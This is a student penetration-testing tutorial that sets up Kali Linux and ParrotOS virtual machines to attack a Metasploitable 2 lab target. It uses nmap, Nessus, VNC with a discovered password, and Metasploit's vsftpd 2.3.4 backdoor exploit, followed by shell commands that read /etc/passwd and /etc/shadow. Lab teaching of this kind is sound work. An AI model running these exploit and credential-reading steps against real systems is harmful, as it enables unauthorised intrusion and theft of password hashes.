Penetration Testing Project: Kali Linux and ParrotOS

Authors:
Trevor Kulczycki-McIntyre
Nathaniel Bitton
Karl Alvarado

Course: Unix-Winter-2024

Project: LIA-Project

Legend: 'sh:' Refers to a command being run in the shell terminal.


Part 1: Introduction
What is Penetration Testing?
Penetration Testing is a cybersecurity technique where simulated attacks are conducted on a computer system, network, or application to identify vulnerabilities and assess security.

Purpose of this Project
The purpose of this project is not to discover new vulnerabilities but to exploit known ones in a step-by-step tutorial. We will document the challenges we faced and how we overcame them.

Part 2: Getting Started with Kali Linux

Downloading Kali Linux (Attacker)

Go to osboxes.org and download the most recent version of Kali Linux.
Kali Linux is a well-known Debian-based OS widely used for simulating penetration tests and other cybersecurity assessments.
In this example, we will use VirtualBox as our hypervisor. VMWare is another viable option; just make sure you download the right image from osboxes.org.

Create a Virtual Machine with Kali VDI file
Open VirtualBox and create a new virtual machine using the Kali Linux .VDI file downloaded in the previous step.
In VirtualBox:
Click New -> Set a name for your VM.
Type: Linux
Version: Debian 64-bit
Click Expert Mode.
Hard-Disk -> Use an existing hard disk file.
Click the small folder icon to browse and add your .vdi file, then select it and click Choose.
Allocate desired RAM and CPUs (e.g., 5GB of RAM and 1 CPU).
Press Finish.

Boot it Up!

Start the VM.
Log in using:
Username: osboxes
Password: osboxes.org
You should see the Kali Linux desktop screen.

Downloading the Victim (Metasploitable 2)

Go to sourceforge.net and download the Metasploitable 2 .zip file.
Extract the .zip file.
Create a VM in VirtualBox using the Metasploitable 2 VDI file.
Allocate minimal RAM (e.g., 500MB-1000MB) since there is no GUI.

Network Configuration

On both virtual machines:
Go to Network settings in VirtualBox.
Set to Bridged Adapter.
Set Promiscuous Mode to Allow All.

Boot it Up!

Start the Metasploitable 2 VM.
Log in using:
Username: msfadmin
Password: msfadmin
Start Hacking!
Setup
Ensure both VMs are running on the host machine.
Reconnaissance
In Metasploitable 2, run:

sh:
ifconfig
Note the inet address (e.g., 192.168.2.26).
In Kali Linux, open a terminal and run:

sh:
sudo nmap -sV -O <IP Address of victim>
This will scan the victim's IP address for open ports and services.

Exploiting Vulnerabilities

Download Nessus from tenable.com for Linux-Debian-amd64.
Install Nessus:

sh:
sudo dpkg -i <Nessus package file>

Start the Nessus service:
sh
sudo systemctl start nessusd
sudo systemctl enable nessusd
Open a browser and navigate to https://localhost:8834.
Register for Nessus Essentials and activate it using the activation code provided.
Start a scan on the victim's IP address.

Setup the Hack

Install a VNC viewer in Kali Linux:
sh:
sudo apt update
sudo apt install tigervnc-viewer
Use the VNC viewer to access the Metasploitable 2 VNC server:
sh:
xtigervncviewer <IP Address>:<Port>
Enter the password discovered by Nessus.
Confirm the Hack
Write to a file on Metasploitable 2:
sh:
echo "We have successfully breached Metasploitable 2" > /tmp/breach_message.txt
Part 3: Getting Started with ParrotOS

Downloading ParrotOS (Attacker)

Go to osboxes.org and download the most recent version of ParrotOS Linux.
ParrotOS is a well-known Debian-based OS used for penetration tests.
Create a Virtual Machine with Parrot Security OS VDI file
Open VirtualBox and create a new virtual machine using the Parrot OS Linux .VDI file.
In VirtualBox:
Click New -> Set a name for your VM.
Type: Linux
Version: Debian 64-bit
Click Expert Mode.
Hard-Disk -> Use an existing hard disk file.
Add your .vdi file, select it, and click Choose.
Allocate desired RAM and CPUs (e.g., 5GB of RAM and 1 CPU).
Press Finish.

Downloading the Victim (Metasploitable 2)

Go to sourceforge.net and download the Metasploitable 2 .zip file.
Extract the .zip file.
Create a VM in VirtualBox using the Metasploitable 2 VDI file.
Allocate minimal RAM (e.g., 500MB-1000MB) and set the core to 1.

Network Configuration

On both virtual machines:
Go to Network settings in VirtualBox.
Set to Bridged Adapter.
Set Promiscuous Mode to Allow All.

Boot it Up!

Start the ParrotOS VM.
Log in using:
Username: osboxes
Password: osboxes.org
Start the Metasploitable 2 VM.
Log in using:
Username: msfadmin
Password: msfadmin

Start Hacking!

Setup
Ensure both VMs are running on the host machine.

Reconnaissance

Confirm network configuration by running ifconfig or ip a on both VMs to ensure they are on the same subnet.
In ParrotOS, test connectivity to Metasploitable 2:

sh:
ping <IP Address of Metasploitable 2>
Basic Network Scanning with Nmap
In ParrotOS, run:

sh:
sudo nmap -sV -O <IP Address of Metasploitable 2>
Note the open ports and services.
Exploiting Vulnerabilities
Launch Metasploit:

sh:
msfconsole
Search for FTP exploits:

sh:
search ftp
Use the vsftpd 2.3.4 exploit:

sh:
use exploit/unix/ftp/vsftpd_234_backdoor
Set the target:

sh:
set RHOSTS <IP Address of Metasploitable 2>
set RPORT 21
Run the exploit:

sh:
exploit
Interact with the Command Shell
Background the session:

sh:
background
List active sessions:

sh:
sessions -l
Interact with the session:

sh:
sessions -i 1
Verify access and gather system information:

sh:
whoami
uname -a
ifconfig
ls /
cat /etc/passwd
cat /etc/shadow
cd /home
ls
Confirm the hack by writing a message:

sh:
echo "We have successfully breached Metasploitable 2 using ParrotOS" > /tmp/breach_message.txt
wall < /tmp/breach_message.txt
